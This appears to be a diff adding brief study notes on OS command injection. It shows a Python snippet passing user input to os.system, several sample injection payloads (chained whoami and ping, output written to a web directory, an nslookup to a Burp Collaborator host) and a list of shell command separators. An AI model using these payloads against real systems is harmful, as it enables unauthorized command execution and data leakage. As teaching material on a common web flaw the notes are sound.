@@ -1,0 +1,34 @@
+Command line injection eg
+"""
+import os
+i=input("enter a file name")
+os.system("ls i")
+'''
+this is exploitable code due to i can be change into any milicious command like
+
+i=hello ;echo  "hacked" ; whoami
+or
+i=&ping+-c+12+127.0.0.1|
+or
+i= 1|whoami 
+or
+i=email=x||ping+-c+10+127.0.0.1||
+or
+i=x||whoami>/var/www/images/output.txt||
+or
+i= email=x||nslookup+x.burpcollaborator.net||
+
+ number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:
+
+&
+&&
+|
+||
+The following command separators work only on Unix-based systems:
+
+;
+Newline (0x0a or \n)
+On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:
+
+` injected command `
+$( injected command )
